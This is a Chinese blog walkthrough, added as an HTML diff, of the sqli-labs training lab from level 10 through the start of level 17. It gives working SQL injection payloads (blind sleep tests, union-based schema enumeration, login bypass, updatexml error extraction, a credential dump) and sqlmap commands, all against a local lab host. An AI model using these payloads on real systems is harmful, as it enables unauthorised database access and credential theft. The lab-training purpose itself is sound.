@@ -1,0 +1,434 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>sql-labs通关笔记(下) | Don_Joshua's Blog</title><meta name="author" content="Don Joshua"><meta name="copyright" content="Don Joshua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql-labs通关笔记(下) 上次漏了第十关，这次补上，另外几乎所有用到的知识点都在上篇了，找到数据库名之后的操作就不再赘述，在上篇都有讲 上篇地址：sql-labs通关笔记（上）&#x2F;) Less-10：GET -Blind -Time based -double quotes界面在url中加入?id&#x3D;1   在url中加入?id&#x3D;-1   可以基本判断和上一题一样依旧是时间盲注 判断注入点使用各">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-labs通关笔记(下)">
+<meta property="og:url" content="http://example.com/2024/07/02/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8B)/index.html">
+<meta property="og:site_name" content="Don_Joshua&#39;s Blog">
+<meta property="og:description" content="sql-labs通关笔记(下) 上次漏了第十关，这次补上，另外几乎所有用到的知识点都在上篇了，找到数据库名之后的操作就不再赘述，在上篇都有讲 上篇地址：sql-labs通关笔记（上）&#x2F;) Less-10：GET -Blind -Time based -double quotes界面在url中加入?id&#x3D;1   在url中加入?id&#x3D;-1   可以基本判断和上一题一样依旧是时间盲注 判断注入点使用各">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2024-07-02T06:05:34.000Z">
+<meta property="article:modified_time" content="2024-07-02T08:01:07.859Z">
+<meta property="article:author" content="Don Joshua">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/07/02/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8B)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sql-labs通关笔记(下)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-02 16:01:07'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/mystyle.css"><link rel="stylesheet" href="/css/textStyle.css"><link rel="stylesheet" href="/css_layout/calendar.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a id="site-name" href="/">Don_Joshua's Blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql-labs通关笔记(下)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-02T06:05:34.000Z" title="发表于 2024-07-02 14:05:34">2024-07-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-02T08:01:07.859Z" title="更新于 2024-07-02 16:01:07">2024-07-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql-labs通关笔记(下)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sql-labs通关笔记-下"><a href="#sql-labs通关笔记-下" class="headerlink" title="sql-labs通关笔记(下)"></a>sql-labs通关笔记(下)</h1><p><img src="Untitled.png" alt="Untitled"></p>
+<p>上次漏了第十关，这次补上，另外几乎所有用到的知识点都在上篇了，找到数据库名之后的操作就不再赘述，在上篇都有讲</p>
+<p>上篇地址：<a target="_blank" rel="noopener" href="https://jo4hua.github.io/2024/07/01/sql-labs通关笔记(上">sql-labs通关笔记（上）</a>/)</p>
+<h2 id="Less-10：GET-Blind-Time-based-double-quotes"><a href="#Less-10：GET-Blind-Time-based-double-quotes" class="headerlink" title="Less-10：GET -Blind -Time based -double quotes"></a>Less-10：GET -Blind -Time based -double quotes</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p>
+<p><img src="Untitled%201.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code> </p>
+<p><img src="Untitled%202.png" alt="Untitled"></p>
+<p>可以基本判断和上一题一样依旧是时间盲注</p>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用各种符号加上 and sleep(3)—+来判断闭合方式，需要保持and前的条件为真</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot; and sleep(3)--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：判断闭合方式为双引号</strong></p>
+<p><img src="Untitled%203.png" alt="Untitled"></p>
+<h3 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot; and if(ascii(substring((select database()),1,1))&gt;10,sleep(3),0)--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：判断出数据库的第一个字符为s，睡眠三秒，后面将使用sqlmap进行演示</strong></p>
+<p><img src="Untitled%204.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.199.128/sqli/Less-10/?id=1&quot;</span> --threads 10 --level 2 --batch</span><br></pre></td></tr></table></figure>
+<ul>
+<li>—level 指需要执行的测试等级，一共有5个等级（1~5级），可不加“level”，默认是1级,5级尝试的payload最多，但是也最慢，这里只需要使用二级即可</li>
+<li>—batch 从不询问用户输入，默认yes</li>
+</ul>
+<p><strong>结果：判断为时间盲注</strong></p>
+<p><img src="Untitled%205.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.199.128/sqli/Less-10/?id=1&quot;</span> --threads 10 --level 2 --batch --current-db </span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名security，后面我们就不再演示，第十关结束</strong></p>
+<p><img src="Untitled%206.png" alt="Untitled"></p>
+<h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><h2 id="Less-11：POST-Error-Based-single-quotes-string"><a href="#Less-11：POST-Error-Based-single-quotes-string" class="headerlink" title="Less-11：POST -Error Based -single quotes- string"></a>Less-11：POST -Error Based -single quotes- string</h2><h3 id="界面-1"><a href="#界面-1" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%207.png" alt="Untitled"></p>
+<h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>像是这种post类型的，可以现在每一个输入框内进行尝试，先在username中使用单引号进行尝试</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：登陆成功，说明闭合方式为单引号，并且有回显，我们就可以尝试联合查询注入</strong></p>
+<p><img src="Untitled%208.png" alt="Untitled"></p>
+<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 3 #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：不是三列</strong></p>
+<p><img src="Untitled%209.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 2 #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：字段数为2列</strong></p>
+<p><img src="Untitled%2010.png" alt="Untitled"></p>
+<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2 #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：</strong></p>
+<p><img src="Untitled%2011.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-1"><a href="#爆破数据库名-1" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,database() #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名称security</strong></p>
+<p><img src="Untitled%2012.png" alt="Untitled"></p>
+<h3 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：表名emails,referers,uagents,users</strong></p>
+<p><img src="Untitled%2013.png" alt="Untitled"></p>
+<h3 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：users表的字段名id,username,password</strong></p>
+<p><img src="Untitled%2014.png" alt="Untitled"></p>
+<h3 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,group_concat(username,0x7e,password) from users #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据</strong></p>
+<p><img src="Untitled%2015.png" alt="Untitled"></p>
+<h2 id="Less-12：POST-Error-Based-Double-quotes-String-with-twist"><a href="#Less-12：POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="Less-12：POST-Error Based-Double quotes-String -with twist"></a>Less-12：POST-Error Based-Double quotes-String -with twist</h2><h3 id="界面-2"><a href="#界面-2" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2016.png" alt="Untitled"></p>
+<h3 id="判断注入点-2"><a href="#判断注入点-2" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>因为有回显，所以直接用\判断注入点以及闭合方式</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\</span><br></pre></td></tr></table></figure>
+<p><strong>报错信息：去掉用来引出报错信息的单引号，发现闭合方式是双引号+括号</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&quot;\&quot;) and password=(&quot;&quot;) LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="Untitled%2017.png" alt="Untitled"></p>
+<h3 id="判断字段数-1"><a href="#判断字段数-1" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;order by 2 #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：字段数为2</strong></p>
+<p><img src="Untitled%2018.png" alt="Untitled"></p>
+<h3 id="判断回显位置"><a href="#判断回显位置" class="headerlink" title="判断回显位置"></a>判断回显位置</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;) union select 1,2 #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：</strong></p>
+<p><img src="Untitled%2019.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-2"><a href="#爆破数据库名-2" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;) union select 1,database() #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名为security，后面就不在赘述，第十二关结束</strong></p>
+<p><img src="Untitled%2020.png" alt="Untitled"></p>
+<h2 id="Less-13：PosT-Double-Injection-Single-quotes-string-with-twist"><a href="#Less-13：PosT-Double-Injection-Single-quotes-string-with-twist" class="headerlink" title="Less-13：PosT -Double Injection -Single quotes- string - with twist"></a>Less-13：PosT -Double Injection -Single quotes- string - with twist</h2><h3 id="界面-3"><a href="#界面-3" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2021.png" alt="Untitled"></p>
+<h3 id="判断注入点-3"><a href="#判断注入点-3" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\</span><br></pre></td></tr></table></figure>
+<p><strong>报错信息：单引号加括号闭合</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;) and password=(&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure>
+<p><img src="Untitled%2022.png" alt="Untitled"></p>
+<p><strong>payload：使用万能密码登录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) or 1=1#</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：无回显，但是一开始我们知道有报错信息，可以使用报错注入</strong></p>
+<p><img src="Untitled%2023.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and updatexml(1,concat(0x7e,database()),1)#</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：爆破出数据库名，后面不再演示，第十三关结束</strong></p>
+<p><img src="Untitled%2024.png" alt="Untitled"></p>
+<h2 id="Less-14：PosT-Double-Injection-single-quotes-string-with-twist"><a href="#Less-14：PosT-Double-Injection-single-quotes-string-with-twist" class="headerlink" title="Less-14：PosT -Double Injection -single quotes- string -with twist"></a>Less-14：PosT -Double Injection -single quotes- string -with twist</h2><h3 id="界面-4"><a href="#界面-4" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2025.png" alt="Untitled"></p>
+<h3 id="判断注入点-4"><a href="#判断注入点-4" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>直接\</p>
+<p><strong>报错信息：使用双引号闭合</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&quot;\&quot; and password=&quot;&quot; LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure>
+<h3 id="爆破数据库名-3"><a href="#爆破数据库名-3" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; and updatexml(1,concat(0x7e,database()),1) #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：security，后面不再演示，第十四关结束</strong></p>
+<p><img src="Untitled%2026.png" alt="Untitled"></p>
+<h2 id="Less-15：PosT-Blind-Boolian-time-Based-Single-quotes"><a href="#Less-15：PosT-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="Less-15：PosT -Blind-Boolian/time Based -Single quotes"></a>Less-15：PosT -Blind-Boolian/time Based -Single quotes</h2><h3 id="界面-5"><a href="#界面-5" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2027.png" alt="Untitled"></p>
+<h3 id="判断注入点-5"><a href="#判断注入点-5" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload：无回显，使用各种符号结合orr1=1进行判断注入点</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; or 1=1# </span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：判断闭合方式为单引号</strong></p>
+<p><img src="Untitled%2028.png" alt="Untitled"></p>
+<h3 id="爆破数据库"><a href="#爆破数据库" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p><strong>payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; or substring(database(),1,1)=&#x27;</span>s<span class="string">&#x27;# </span></span><br><span class="line"><span class="string">1&#x27;</span> or database()=<span class="string">&#x27;security&#x27;</span><span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库为security，后面可以使用sqlmap，不再演示，第十五关结束</strong></p>
+<p><img src="Untitled%2029.png" alt="Untitled"></p>
+<h2 id="Less-16：PosT-Blind-Boolian-Time-Based-Double-quotes"><a href="#Less-16：PosT-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="Less-16：PosT -Blind-Boolian/Time Based -Double quotes"></a>Less-16：PosT -Blind-Boolian/Time Based -Double quotes</h2><h3 id="界面-6"><a href="#界面-6" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2030.png" alt="Untitled"></p>
+<h3 id="判断注入点-6"><a href="#判断注入点-6" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;) or 1=1#</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：判断出闭合方式为双引号+括号</strong></p>
+<p><img src="Untitled%2031.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-4"><a href="#爆破数据库名-4" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;) or substring(database(),1,1)=&#x27;s&#x27;#</span></span><br><span class="line"><span class="string">1&quot;</span>) or database()=<span class="string">&#x27;security&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名</strong></p>
+<p><img src="Untitled%2032.png" alt="Untitled"></p>
+<h3 id="使用sqlmap进行POST注入"><a href="#使用sqlmap进行POST注入" class="headerlink" title="使用sqlmap进行POST注入"></a>使用sqlmap进行POST注入</h3><p>这里需要结合我们的burp进行抓包</p>
+<p><strong>结果：将最后一行的post传递的参数复制下来</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=1%22%29+or+database%28%29%3D%27security%27%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="Untitled%2033.png" alt="Untitled"></p>
+<p>现在使用我们的sqlmap</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.199.128/sqli/Less-16/&quot;</span> --data=<span class="string">&quot;uname=1&amp;passwd=&amp;submit=Submit&quot;</span> --threads 10 --level 3 </span><br></pre></td></tr></table></figure>
+<ul>
+<li>— data 表示post传递的数据 后面跟我们刚刚在burp中复制的东西</li>
+</ul>
+<p><strong>结果：发现存在盲注</strong></p>
+<p><img src="Untitled%2034.png" alt="Untitled"></p>
+<h3 id="使用sqlmap爆破数据库名"><a href="#使用sqlmap爆破数据库名" class="headerlink" title="使用sqlmap爆破数据库名"></a>使用sqlmap爆破数据库名</h3><p><strong>payload</strong></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.199.128/sqli/Less-16/&quot;</span> --data=<span class="string">&quot;uname=1&amp;passwd=&amp;submit=Submit&quot;</span> --threads <span class="number">10</span> --level <span class="number">3</span> --current-db</span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名，后面不多赘述，第十六关结束</strong></p>
+<p><img src="Untitled%2035.png" alt="Untitled"></p>
+<h2 id="Less-17：PosT-Update-Query-Error-Based-string"><a href="#Less-17：PosT-Update-Query-Error-Based-string" class="headerlink" title="Less-17：PosT -Update Query- Error Based -string"></a>Less-17：PosT -Update Query- Error Based -string</h2><h3 id="界面-7"><a href="#界面-7" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2036.png" alt="Untitled"></p>
+<h3 id="判断注入点-7"><a href="#判断注入点-7" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>可以看到上面有一个大大的黄字，说是密码重置，那么一般遇到密码重置的页面，我们一般都是通过给出正确的用户名来进行修改，先对username判断有没有注入点</p>
